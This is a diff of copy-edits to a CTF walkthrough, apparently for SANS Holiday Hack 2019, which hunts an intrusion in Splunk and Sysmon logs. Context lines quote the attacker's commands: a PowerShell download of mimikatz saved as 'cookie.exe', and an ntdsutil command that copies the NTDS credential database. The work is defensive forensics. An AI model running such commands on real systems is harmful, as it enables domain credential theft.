@@ -340,7 +340,7 @@ https://splunk.elfu.org/ with the username: `elf` / Password: `elfsocks`.
     --Bradly Buttercups
     ```
     * `123456789`
-    * Seems like he cheated because the professors was like
+    * Seems like he cheated because the professors said
     ```
     Bradly, 
 
@@ -503,7 +503,7 @@ Content-Length: 32
 Christmas Cheer Laser Powered On
 ```
 
-After that we can query the output and it seems like it's just random.
+Then we can query the output. It seems like it's just random.
 
 ```powershell
 (Invoke-WebRequest -Uri http://localhost:1225/api/gas -Method POST
@@ -1121,7 +1121,7 @@ first?
 
 Searching for `cookie_recipe.exe` we can then click on `EventID` to the left and
 then click on `Quick Values` to bring up a chart. Then we can click on the
-magnifying glass besides each value to filter by that event ID.
+magnifying glass beside each value to filter by that event ID.
 
 * `cookie_recipe.exe AND EventID:2` is when Firefox created the downloaded file.
 * `cookie_recipe.exe AND EventID:3` is what we want.
@@ -1176,8 +1176,8 @@ https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20190813/mimikatz
 -OutFile cookie.zip "
 ```
 
-Searching for `mimikatz` we find another event. It say the original file name of
-`cookie.exe` was `mimikatz`. Seems like it was renamed sometime.
+Searching for `mimikatz` we find another event. It says the original filename of
+`cookie.exe` was `mimikatz`. It was renamed.
 
 `C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\cookie.exe "`
 
@@ -1218,7 +1218,7 @@ Our info:
 * Filter: `SourceHostName:ELFU\-RES\-WKS2 AND DestinationHostname:elfu\-res\-wks3`
 
 The attacker has GUI access to workstation 2 via RDP. They likely use this GUI
-connection to access the file system of of workstation 3 using explorer.exe via
+connection to access the file system of workstation 3 using explorer.exe via
 UNC file paths (which is why we don't see any cmd.exe or powershell.exe process
 creates). However, we still see the successful network authentication for this
 with event id 4624 and logon type 3.
@@ -1363,7 +1363,7 @@ the module might.
 
 https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump
 
-Maybe it's `procdump`. no it's not.
+Maybe it's `procdump`. No it's not.
 
 Search with `EQL` at https://eqllib.readthedocs.io/en/latest/guides/sysmon.html#example-searches-with-eql
 
@@ -1374,28 +1374,28 @@ This query did not work.
 
 Looking here, https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/
 
-we can see some tools. Goinmg through the tools, we get to `ntdsutil`. Searching
+We can see some tools. Going through the tools, we get to `ntdsutil`. Searching
 for it, we get to the last entry in the file which has our answer.
 
 ```json
 {
-        "command_line": "ntdsutil.exe  \"ac i ntds\" ifm \"create full c:\\hive\" q q",
-        "event_type": "process",
-        "logon_id": 999,
-        "parent_process_name": "cmd.exe",
-        "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
-        "pid": 3556,
-        "ppid": 3440,
-        "process_name": "ntdsutil.exe",
-        "process_path": "C:\\Windows\\System32\\ntdsutil.exe",
-        "subtype": "create",
-        "timestamp": 132186398470300000,
-        "unique_pid": "{7431d376-dee7-5dd3-0000-0010f0c44f00}",
-        "unique_ppid": "{7431d376-dedb-5dd3-0000-001027be4f00}",
-        "user": "NT AUTHORITY\\SYSTEM",
-        "user_domain": "NT AUTHORITY",
-        "user_name": "SYSTEM"
-    }
+    "command_line": "ntdsutil.exe  \"ac i ntds\" ifm \"create full c:\\hive\" q q",
+    "event_type": "process",
+    "logon_id": 999,
+    "parent_process_name": "cmd.exe",
+    "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
+    "pid": 3556,
+    "ppid": 3440,
+    "process_name": "ntdsutil.exe",
+    "process_path": "C:\\Windows\\System32\\ntdsutil.exe",
+    "subtype": "create",
+    "timestamp": 132186398470300000,
+    "unique_pid": "{7431d376-dee7-5dd3-0000-0010f0c44f00}",
+    "unique_ppid": "{7431d376-dedb-5dd3-0000-001027be4f00}",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "user_domain": "NT AUTHORITY",
+    "user_name": "SYSTEM"
+}
 ```
 
 Answer: `ntdsutil`
